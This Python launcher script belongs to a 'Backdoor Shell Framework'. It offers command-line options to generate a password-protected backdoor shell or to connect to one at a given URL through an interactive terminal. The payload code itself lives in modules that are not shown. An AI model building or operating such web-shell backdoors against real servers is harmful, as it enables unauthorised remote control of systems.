#!/usr/bin/python
#
# Author(s): Matias Menares (Gh0st)
# Backdoor Shell Framework

from core.config import Config
from core.terminal import Terminal
from core.generate import Generator
from core.banner import Banner
from core.version import Version

import os
import argparse
import sqlite3 as lite

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="Url")
parser.add_argument("-g", help="Generate Shell")
parser.add_argument("-p", help="Password")
args = parser.parse_args()
#Banner
banner = Banner()
banner.get_banner()
#Version Updater
version = Version()
version.update()

params = parser.parse_args()
#Init 1
def main(params):
	if params.g and params.p:
		shell.set_generator()
	elif params.u and params.p:
		terminal.loop()
	else:
		print("Type -h for help.")
if __name__ == '__main__':
	terminal = Terminal(params.u,params.p)
	shell = Generator(params.g,params.p)

try:
    main(params)
except (KeyboardInterrupt, EOFError):
    log.info('Exiting.')
